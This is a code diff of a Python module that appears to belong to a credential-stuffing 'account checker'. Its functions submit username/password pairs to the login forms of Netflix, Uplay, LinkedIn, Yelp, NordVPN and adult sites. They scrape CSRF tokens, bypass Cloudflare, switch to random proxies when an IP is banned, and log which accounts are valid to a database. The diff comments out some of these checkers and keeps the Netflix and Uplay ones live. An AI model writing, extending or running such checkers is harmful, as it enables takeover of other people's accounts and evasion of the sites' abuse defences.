@@ -25,80 +25,80 @@ from manage_requests import ManageRequests
 
 
 
-def linkedin(usr : str, pwd : str, mr : ManageRequests):
-    get_url = "https://www.linkedin.com/login"
-    post_url = "https://www.linkedin.com/checkpoint/lg/login-submit"
+# def linkedin(usr : str, pwd : str, mr : ManageRequests):
+#     get_url = "https://www.linkedin.com/login"
+#     post_url = "https://www.linkedin.com/checkpoint/lg/login-submit"
+#
+#     # Get main page with tokens
+#     res = mr.req.get(get_url, headers={'User-Agent': 'Mozilla/5.0'})
+#     # Filter out tokens
+#     soup = BeautifulSoup(res.text, features="html.parser")
+#     csrfToken = soup.find('input', attrs={'name': 'csrfToken'})['value']
+#     sIdString = soup.find('input', attrs={'name': 'sIdString'})['value']
+#     loginCsrfParam = soup.find('input', attrs={'name': 'loginCsrfParam'})['value']
+#
+#     # Post request to login
+#     res = mr.post_with_checks(post_url,
+#                               data={'session_key': usr,
+#                                     'session_password': pwd,
+#                                     'csrfToken': csrfToken,
+#                                     'sIdString': sIdString,
+#                                     'loginCsrfParam': loginCsrfParam,
+#                                     })
+#
+#     if 'login' not in res.url:
+#         mr.db.update_result(usr, pwd, "linkedin", "True")
+#         log.info("Account valid {}".format(usr))
+#     else:
+#         mr.db.update_result(usr, pwd, "linkedin", "False")
+#         log.info("Account error {} {}".format(usr, pwd))
+#     log.info("-------------------------------")
+#     mr.req.cookies.clear()
 
-    # Get main page with tokens
-    res = mr.req.get(get_url, headers={'User-Agent': 'Mozilla/5.0'})
-    # Filter out tokens
-    soup = BeautifulSoup(res.text, features="html.parser")
-    csrfToken = soup.find('input', attrs={'name': 'csrfToken'})['value']
-    sIdString = soup.find('input', attrs={'name': 'sIdString'})['value']
-    loginCsrfParam = soup.find('input', attrs={'name': 'loginCsrfParam'})['value']
 
-    # Post request to login
-    res = mr.post_with_checks(post_url,
-                              data={'session_key': usr,
-                                    'session_password': pwd,
-                                    'csrfToken': csrfToken,
-                                    'sIdString': sIdString,
-                                    'loginCsrfParam': loginCsrfParam,
-                                    })
+# def yelp(usr : str, pwd : str, mr : ManageRequests):
+#     site_url = "https://www.yelp.co.uk/login"
+#
+#     # Get main page with csrftok
+#     res = mr.req.get(site_url, headers={'User-Agent': 'Mozilla/5.0'})
+#     # Filter out csrftok value
+#     soup = BeautifulSoup(res.text, features="html.parser")
+#     csrftok = soup.find('form', id='ajax-login').find('input', 'csrftok')['value']
+#
+#     # Post request to login
+#     res = mr.post_with_checks(site_url,
+#                               data={'email': usr,
+#                                     'password': pwd,
+#                                     'csrftok': csrftok
+#                                     })
+#
+#     if 'login' not in res.url:
+#         mr.db.update_result(usr, pwd, "yelp", True)
+#         log.info("Account valid {}".format(usr))
+#     else:
+#         mr.db.update_result(usr, pwd, "yelp", False)
+#         log.info("Account error {} {}".format(usr, pwd))
+#     log.info("-------------------------------")
+#     mr.req.cookies.clear()
 
-    if 'login' not in res.url:
-        mr.db.update_result(usr, pwd, "linkedin", "True")
-        log.info("Account valid {}".format(usr))
-    else:
-        mr.db.update_result(usr, pwd, "linkedin", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-    log.info("-------------------------------")
-    mr.req.cookies.clear()
-
-
-def yelp(usr : str, pwd : str, mr : ManageRequests):
-    site_url = "https://www.yelp.co.uk/login"
-
-    # Get main page with csrftok
-    res = mr.req.get(site_url, headers={'User-Agent': 'Mozilla/5.0'})
-    # Filter out csrftok value
-    soup = BeautifulSoup(res.text, features="html.parser")
-    csrftok = soup.find('form', id='ajax-login').find('input', 'csrftok')['value']
-
-    # Post request to login
-    res = mr.post_with_checks(site_url,
-                              data={'email': usr,
-                                    'password': pwd,
-                                    'csrftok': csrftok
-                                    })
-
-    if 'login' not in res.url:
-        mr.db.update_result(usr, pwd, "yelp", "True")
-        log.info("Account valid {}".format(usr))
-    else:
-        mr.db.update_result(usr, pwd, "yelp", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-    log.info("-------------------------------")
-    mr.req.cookies.clear()
-
-def youporn(usr : str, pwd : str, mr : ManageRequests):
-    post_url = "https://www.youporn.com/login/"
-    # Post request to login
-    res = mr.post_with_checks(post_url,
-                              data={'login[username]': usr,
-                                    'login[password]': pwd,
-                                    'login[previous]': '',
-                                    'login[logical_data': '{}',
-                                    })
-    if "Bad credentials" in str(res.text):
-        mr.db.update_result(usr, pwd, "youporn", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-    else:
-        mr.db.update_result(usr, pwd, "youporn", "True")
-        log.info("Account valid {}".format(usr))
-
-    log.info("-------------------------------")
-    mr.req.cookies.clear()
+# def youporn(usr : str, pwd : str, mr : ManageRequests):
+#     post_url = "https://www.youporn.com/login/"
+#     # Post request to login
+#     res = mr.post_with_checks(post_url,
+#                               data={'login[username]': usr,
+#                                     'login[password]': pwd,
+#                                     'login[previous]': '',
+#                                     'login[logical_data': '{}',
+#                                     })
+#     if "Bad credentials" in str(res.text):
+#         mr.db.update_result(usr, pwd, "youporn", False)
+#         log.info("Account error {} {}".format(usr, pwd))
+#     else:
+#         mr.db.update_result(usr, pwd, "youporn", True)
+#         log.info("Account valid {}".format(usr))
+#
+#     log.info("-------------------------------")
+#     mr.req.cookies.clear()
 
 
 # def pornhub(usr: str, pwd: str, mr: ManageRequests):
@@ -125,10 +125,10 @@ def youporn(usr : str, pwd : str, mr : ManageRequests):
 #                                     })
 #
 #     if int(json.loads(res.content)["success"]) == 1:
-#         mr.db.update_result(usr, pwd, "pornhub", "True")
+#         mr.db.update_result(usr, pwd, "pornhub", True)
 #         log.info("Account valid {}".format(usr))
 #     else:
-#         mr.db.update_result(usr, pwd, "pornhub", "False")
+#         mr.db.update_result(usr, pwd, "pornhub", False)
 #         log.info("Account error {} {}".format(usr, pwd))
 #     log.info("-------------------------------")
 #     mr.req.cookies.clear()
@@ -145,12 +145,12 @@ def youporn(usr : str, pwd : str, mr : ManageRequests):
 #                                    'token': token,
 #                                     })
 
+
 def netflix(usr: str, pwd: str, mr: ManageRequests):
     site_url = "https://www.netflix.com/Login"
 
-    # Get login page with authURL
     res = mr.get_with_checks(site_url, headers={'User-Agent': 'Mozilla/5.0'})
-    # Filter out authURL value
+
     if res:
         soup = BeautifulSoup(res.text, features="html.parser")
         auth_url = soup.find('input', attrs={'name': 'authURL'})['value']
@@ -169,18 +169,18 @@ def netflix(usr: str, pwd: str, mr: ManageRequests):
                                         })
 
         if 'Login' not in res.url:
-            mr.db.update_result(usr, pwd, "netflix", "True")
+            mr.db.update_result(usr, pwd, "netflix", True)
             log.info("Account valid {}".format(usr))
         else:
-            mr.db.update_result(usr, pwd, "netflix", "False")
+            mr.db.update_result(usr, pwd, "netflix", False)
             log.info("Account error {} {}".format(usr, pwd))
         log.info("-------------------------------")
     else:
-        log.error("Netflix banned the ip, forcing change")
-        mr.set_random_proxy()
-        netflix(usr, pwd, mr)
+        mr.db.update_result(usr, pwd, "netflix", False)
+        log.info("Account error {} {}".format(usr, pwd))
     log.info("-------------------------------")
     mr.req.cookies.clear()
+
 
 def uplay(usr : str, pwd : str, mr : ManageRequests):
     usr: str
@@ -193,43 +193,49 @@ def uplay(usr : str, pwd : str, mr : ManageRequests):
     res = mr.post_with_checks(site_post)
     if res:
         if res.status_code == 200:
-            mr.db.update_result(usr, pwd, "uplay", "True")
+            mr.db.update_result(usr, pwd, "uplay", True)
             log.info("Account valid {}".format(usr))
         else:
-            mr.db.update_result(usr, pwd, "uplay", "False")
+            mr.db.update_result(usr, pwd, "uplay", False)
             log.info("Account error {} {}".format(usr, pwd))
     else:
-        log.error("Uplay banned the ip, forcing change")
-        mr.set_random_proxy()
-        uplay(usr, pwd, mr)
+        decode = res.content.decode("utf-8")
+        if "Invalid credentials" in decode or "Authentication forbidden" in decode:
+            mr.db.update_result(usr, pwd, "uplay", False)
+            log.info("Account error {} {}".format(usr, pwd))
+        else:
+            print(res.content)
+            log.info("Should not happen")
+            mr.set_random_proxy()
+            uplay(usr, pwd, mr)
     log.info("-------------------------------")
     mr.req.cookies.clear()
     
-def nordvpn(usr : str, pwd : str, mr : ManageRequests):
-    """
-    Custom functions must have 3 params: username and password to check, and a ManageRequests object
-    The MR object has all the primitives that you need.
-    Remember to update the database via mr.db
-    """
-
-    sitePost = "https://ucp.nordvpn.com/api/v1/users/login"
-    siteGet = "https://ucp.nordvpn.com/login"
-    # Retrieve CF valid cookie
-
-    cookies = mr.bypass_cf(siteGet)
-    # change proxy account
-    res = mr.post_with_checks(sitePost,
-                              data={"username": usr, "password": pwd}, cookies=cookies)
-    res = dict(res.cookies).get("token", None)
-
-    # check if inside the cookie the token is set, if positive the account is valid
-    if res:
-        mr.db.update_result(usr, pwd, "nordvpn", "True")
-        mr.db.update_result(usr, pwd, "nordvpnProxy", "True")
-        log.info("Account valid {}".format(usr))
-    else:
-        mr.db.update_result(usr, pwd, "nordvpn", "False")
-        mr.db.update_result(usr, pwd, "nordvpnProxy", "False")
-        log.info("Account error {} {}".format(usr, pwd))
-    log.info("-------------------------------")
-    mr.req.cookies.clear()
+# def nordvpn(usr : str, pwd : str, mr : ManageRequests):
+#     """
+#     Custom functions must have 3 params: username and password to check, and a ManageRequests object
+#     The MR object has all the primitives that you need.
+#     Remember to update the database via mr.db
+#     """
+#
+#     sitePost = "https://ucp.nordvpn.com/api/v1/users/login"
+#     siteGet = "https://ucp.nordvpn.com/login"
+#     # Retrieve CF valid cookie
+#
+#     cookies = mr.bypass_cf(siteGet)
+#     # change proxy account
+#     res = mr.post_with_checks(sitePost,
+#                               data={"username": usr, "password": pwd}, cookies=cookies)
+#     res = dict(res.cookies).get("token", None)
+#
+#     # check if inside the cookie the token is set, if positive the account is valid
+#     if res:
+#         mr.db.update_result(usr, pwd, "nordvpn", True)
+#         mr.db.update_result(usr, pwd, "nordvpnProxy", True)
+#         log.info("Account valid {}".format(usr))
+#     else:
+#         mr.db.update_result(usr, pwd, "nordvpn", False)
+#         mr.db.update_result(usr, pwd, "nordvpnProxy", False)
+#         log.info("Account error {} {}".format(usr, pwd))
+#     log.info("-------------------------------")
+#     mr.req.cookies.clear()
